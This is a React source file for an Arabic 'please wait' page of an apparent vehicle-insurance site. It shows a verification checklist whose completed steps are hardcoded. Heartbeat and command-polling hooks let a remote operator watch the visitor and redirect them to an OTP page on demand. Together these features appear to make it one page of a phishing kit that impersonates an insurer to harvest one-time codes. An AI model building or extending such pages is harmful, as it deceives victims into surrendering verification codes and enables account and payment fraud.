import { useEffect, useState } from "react";
import { Shield, Loader2, Clock } from "lucide-react";
import { api } from "@/lib/api";
import { useHeartbeat, useCommandPoll } from "@/lib/useHeartbeat";

export default function WaitingPage() {
  useHeartbeat("انتظار");
  const [dots, setDots] = useState(".");

  useEffect(() => {
    const iv = setInterval(() => setDots(d => d.length >= 3 ? "." : d + "."), 700);
    return () => clearInterval(iv);
  }, []);

  useCommandPoll({
    "redirect:otp": () => { window.location.href = "/wiqaya/otp"; },
    "redirect:home": () => { window.location.href = "/wiqaya/"; },
  });

  return (
    <div className="min-h-screen flex items-center justify-center" dir="rtl"
      style={{ fontFamily: "system-ui, -apple-system, Arial, sans-serif", background: "linear-gradient(160deg, #f0f4f8, #e8f5f0)" }}>
      <div className="max-w-sm w-full mx-4 text-center space-y-8">
        <div className="relative mx-auto w-24 h-24">
          <div className="w-24 h-24 rounded-full flex items-center justify-center" style={{ background: "#1a3a5c" }}>
            <Shield className="w-12 h-12 text-white" strokeWidth={1.5} />
          </div>
          <div className="absolute -bottom-1 -right-1 w-8 h-8 rounded-full bg-amber-400 flex items-center justify-center animate-bounce">
            <Loader2 className="w-5 h-5 text-white animate-spin" />
          </div>
        </div>

        <div className="space-y-2">
          <h2 className="text-[24px] font-extrabold text-gray-900">الرجاء الانتظار{dots}</h2>
          <p className="text-[14px] text-gray-500 leading-relaxed">
            نقوم بمراجعة طلبك والتحقق من بياناتك<br />يرجى الانتظار لحظات
          </p>
        </div>

        <div className="bg-white rounded-2xl border border-gray-100 shadow-sm p-5 text-right space-y-3.5">
          {[
            { label: "التحقق من الهوية", done: true },
            { label: "التحقق من بيانات السيارة", done: true },
            { label: "مراجعة طلب التأمين", done: false },
            { label: "إعداد العروض المناسبة", done: false },
          ].map(item => (
            <div key={item.label} className="flex items-center gap-3">
              <div className={`w-5 h-5 rounded-full flex items-center justify-center flex-shrink-0
                ${item.done ? "bg-emerald-500" : "bg-amber-100"}`}>
                {item.done
                  ? <span className="text-white text-[11px] font-bold">✓</span>
                  : <Loader2 className="w-3 h-3 text-amber-500 animate-spin" />}
              </div>
              <span className={`text-[13px] font-semibold ${item.done ? "text-gray-700" : "text-amber-600"}`}>
                {item.label}
              </span>
            </div>
          ))}
        </div>

        <div className="flex items-center justify-center gap-1.5 text-[12px] text-gray-400">
          <Clock className="w-3.5 h-3.5" />
          <span>قد يستغرق هذا من دقيقة إلى ثلاث دقائق</span>
        </div>
      </div>
    </div>
  );
}
